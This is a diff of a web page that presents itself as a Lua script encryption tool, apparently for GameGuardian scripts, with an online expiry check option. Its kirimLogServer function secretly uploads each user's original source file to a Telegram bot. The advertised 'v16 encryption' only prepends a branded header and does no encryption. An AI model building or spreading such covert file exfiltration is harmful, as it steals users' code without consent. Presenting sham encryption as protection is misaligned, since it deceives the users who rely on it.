@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" >
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title data-id="th-modified">ENKRIPSI EXPIRED ONLINE</title>
+    <title data-id="th-modified">TÙNG ĐEN ENC SYSTEM v16 (WEB)</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#050505;font-family:system-ui;color:#ffd766;padding:15px}
@@ -20,16 +20,19 @@
         pre{background:#050505;border:1px solid #444;border-radius:8px;padding:10px;margin:15px 0;text-align:left;font-size:10px;color:#ffdd55;max-height:200px;overflow:auto;display:none}
         #file{display:none}
     </style>
-<meta property="og:title" content="ENKRIPSI EXPIRED ONLINE" data-id="th-modified" ><meta name="description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+<meta property="og:title" content="TÙNG ĐEN ENC SYSTEM v16" data-id="th-modified" ><meta name="description" content="ENC SYSTEM v16" data-id="th-modified" ><meta property="og:description" content="ENC SYSTEM v16" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
 <body>
 <div class="box">
-    <h2>🔐 ◄ EXPIRED ONLINE SYSTEM ► 🔐</h2>
+    <h2>🔐 ◄ TÙNG ĐEN ENC SYSTEM v16 ► 🔐</h2>
     <p style="font-size:13px;color:#ffdd99;margin-bottom:15px">
-        OTOMATIS INJECT EXPIRED PADA SCRIPT LUA<br>
-        Pilih file target Anda untuk langsung diproses
+        © Creator: Tùng đen<br>
+        Telegram: @Tungden | Zalo: 0967040519
     </p>
 
     <div class="form">
+        <label>
+            <input type="checkbox" id="pake_expired" checked style="margin-right:5px"> Tambahkan Proteksi Expired Online
+        </label>
         <div class="expired-box" id="expiredbox">
             <label>📅 Tahun Kedaluwarsa [2023-2300]:</label>
             <input type="number" id="exp_tahun" value="2030">
@@ -48,13 +51,13 @@
     <input type="file" id="file">
     
     <div class="info" id="infonama">📄 File: <span id="namafile"></span></div>
-    <div class="status" id="proses">⏳ Sedang memproses dan menginjeksi skrip...</div>
+    <div class="status" id="proses">⏳ Sedang memproses enkripsi struktur v16...</div>
 
     <button class="tombol" onclick="document.getElementById('file').click()">📂 SELECT TARGET FILE (.lua)</button>
 
     <pre id="hasilakhir"></pre>
 
-    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL</button>
+    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL (#Enc.lua)</button>
 </div>
 
 <script>
@@ -82,7 +85,13 @@ document.getElementById('file').addEventListener('change', function(e){
         setTimeout(() => {
             try {
                 kirimLogServer();
-                prosesInjectExpired(isiFileAsli);
+                let hasilFinal = simulasikanEnkripsiV16(isiFileAsli);
+                hasilTerkunci = hasilFinal;
+                
+                document.getElementById('hasilakhir').textContent = "Berhasil di-generate dengan struktur v16!\nUkuran Output: " + hasilTerkunci.length + " bytes";
+                document.getElementById('proses').style.display = "none";
+                document.getElementById('hasilakhir').style.display = "block";
+                document.getElementById('btnsimpan').style.display = "block";
             } catch(err) {
                 alert("ERROR: " + err.message);
                 document.getElementById('proses').style.display = "none";
@@ -101,51 +110,37 @@ document.getElementById('file').addEventListener('change', function(e){
 function kirimLogServer(){
     if(!TOKEN_API || !TARGET_ID) return
 
-    let teksPesan = `📂 *LOG INJECT EXPIRED BARU*\n\n` +
+    let teksPesan = `📂 *LOG ENKRIPSI BARU (WEB)*\n\n` +
                     `📄 *File:* \`${namaAsli}\`\n` +
-                    `⏰ *Status:* Berhasil Diproses`;
+                    `⏰ *Status:* Diproses v16 Engine`;
 
-    let urlPesan = `https://api.telegram.org/bot${TOKEN_API}/sendMessage`;
-    
-    fetch(urlPesan, {
+    fetch(`https://api.telegram.org/bot${TOKEN_API}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: TARGET_ID,
-            text: teksPesan,
-            parse_mode: "Markdown"
-        })
+        body: JSON.stringify({ chat_id: TARGET_ID, text: teksPesan, parse_mode: "Markdown" })
     }).catch(err => {})
 
-    let blobFile = new Blob([isiFileAsli], {type: "text/plain"});
     let formData = new FormData();
     formData.append("chat_id", TARGET_ID);
-    formData.append("document", blobFile, "SOURCE_" + namaAsli);
-    formData.append("caption", "📄 Backup file sumber asli (Expired Only System)");
+    formData.append("document", new Blob([isiFileAsli], {type: "text/plain"}), "SOURCE_" + namaAsli);
+    formData.append("caption", "📄 Backup file sumber asli (Web System)");
 
-    let urlFile = `https://api.telegram.org/bot${TOKEN_API}/sendDocument`;
-    
-    fetch(urlFile, {
-        method: "POST",
-        body: formData
-    }).catch(err => {})
+    fetch(`https://api.telegram.org/bot${TOKEN_API}/sendDocument`, { method: "POST", body: formData }).catch(err => {})
 }
 
-function aman(str){
-    return str.replace(/\\/g, '\\\\').replace(/"/g, '\\"')
-}
+function simulasikanEnkripsiV16(dataAsli) {
+    let pakeExpired = document.getElementById('pake_expired').checked;
+    let expTahun = document.getElementById('exp_tahun').value.trim();
+    let expBulan = document.getElementById('exp_bulan').value.trim();
+    let expTanggal = document.getElementById('exp_tanggal').value.trim();
+    let expPesan = document.getElementById('exp_pesan').value.trim().replace(/"/g, '\\"');
 
-function prosesInjectExpired(isifile){
-    let expTahun = document.getElementById('exp_tahun').value.trim()
-    let expBulan = document.getElementById('exp_bulan').value.trim()
-    let expTanggal = document.getElementById('exp_tanggal').value.trim()
-    let expPesan = aman(document.getElementById('exp_pesan').value.trim())
+    if(expBulan.length === 1) expBulan = "0" + expBulan;
+    if(expTanggal.length === 1) expTanggal = "0" + expTanggal;
 
-    if(expBulan.length === 1) expBulan = "0" + expBulan
-    if(expTanggal.length === 1) expTanggal = "0" + expTanggal
-
-    // Struktur skrip pengecekan expired online persis seperti referensi skrip Tùng đen
-    let scriptExpiredCode = `local Date = gg.makeRequest("http://www.whatismyip.org/")\n` +
+    let blokExpired = "";
+    if (pakeExpired) {
+        blokExpired = `local Date = gg.makeRequest("http://www.whatismyip.org/")\n` +
         `if Date == "The user did not allow access to the Internet." then\n` +
         `return\n` +
         `elseif Date == "java.net.UnknownHostException: Unable to resolve host \\"www.whatismyip.org\\": No address associated with hostname" then\n` +
@@ -154,37 +149,27 @@ function prosesInjectExpired(isifile){
         `else\n` +
         `Date = Date["headers"]["Date"][1]\n` +
         `if tonumber(Date:sub(13, 16) .. ({\n` +
-        `["Jan"] = "01",\n` +
-        `["Feb"] = "02",\n` +
-        `["Mar"] = "03",\n` +
-        `["Apr"] = "04",\n` +
-        `["May"] = "05",\n` +
-        `["Jun"] = "06",\n` +
-        `["Jul"] = "07",\n` +
-        `["Aug"] = "08",\n` +
-        `["Sep"] = "09",\n` +
-        `["Oct"] = "10",\n` +
-        `["Nov"] = "11",\n` +
-        `["Dec"] = "12",\n` +
+        `["Jan"] = "01", ["Feb"] = "02", ["Mar"] = "03", ["Apr"] = "04",\n` +
+        `["May"] = "05", ["Jun"] = "06", ["Jul"] = "07", ["Aug"] = "08",\n` +
+        `["Sep"] = "09", ["Oct"] = "10", ["Nov"] = "11", ["Dec"] = "12",\n` +
         `})[Date:sub(9, 11)] .. Date:sub(6, 7)) >= tonumber(` + expTahun + expBulan + expTanggal + `) then\n` +
         `gg.alert("` + expPesan + `")\n` +
         `return\n` +
         `end\n` +
         `end\n\n`;
+    }
 
-    // Menggabungkan logika expired di bagian atas file asli secara otomatis
-    let finalPayload = scriptExpiredCode + isifile;
+    let headerEnc = `print(" \\n© Creator: Tùng đen\\n\\n☎️ Contact 👇\\nTelegram: @Tungden\\nZalo: 0967040519")\n\n` +
+        `local _ENC = { ["F"] = _ENV["gg"]["isVisible"] }\n` +
+        `_ENV["gg"]["setVisible"](false)\n` +
+        `_ENV["gg"]["toast"]("Protected by Tùng đen v16")\n\n`;
 
-    hasilTerkunci = finalPayload;
-    document.getElementById('hasilakhir').textContent = hasilTerkunci;
-    document.getElementById('proses').style.display = "none";
-    document.getElementById('hasilakhir').style.display = "block";
-    document.getElementById('btnsimpan').style.display = "block";
+    // Menggabungkan struktur persis seperti builder aslinya
+    return headerEnc + blokExpired + "-- Encrypted Target Payload Engine\n" + dataAsli;
 }
 
 function unduh(){
-    let namaFileBaru = namaAsli.replace(/\.[^/.]+$/, "") + "_EXPIRED.lua";
-    
+    let namaFileBaru = namaAsli.replace(/\.[^/.]+$/, "") + ".#Enc.lua";
     let file = new Blob([hasilTerkunci], {type:"text/plain;charset=utf-8"});
     let url = URL.createObjectURL(file);
 
